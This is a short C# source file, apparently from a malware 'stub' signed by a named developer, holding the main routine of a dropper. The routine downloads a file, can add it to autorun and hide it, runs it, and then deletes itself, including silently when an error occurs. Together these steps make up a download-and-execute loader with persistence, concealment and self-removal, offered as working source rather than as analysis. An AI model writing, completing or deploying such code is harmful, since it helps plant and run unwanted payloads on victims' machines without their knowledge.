// Main-Functions file
// Coded by k3rnel-dev(@k666_dev) - Telegram | github.com/k3rnel-dev

using System.Diagnostics;

namespace Stub.Modules.InternalFuncs
{
    internal class InternalMain
    {
        public static void Execute()
        {
            try
            {
                InternalAux.DownloadFile();

                if (config.AutoRun)
                {
                    InternalAux.AddToAutoRun("XxX", config.FileLocation);
                }

                if (config.HideFile)
                {
                    InternalAux.HideFile(config.FileLocation);
                }

                Process.Start(config.FileLocation);
                InternalAux.SelfRemove();
            }

            catch { InternalAux.SelfRemove(); }


        }
    }
}
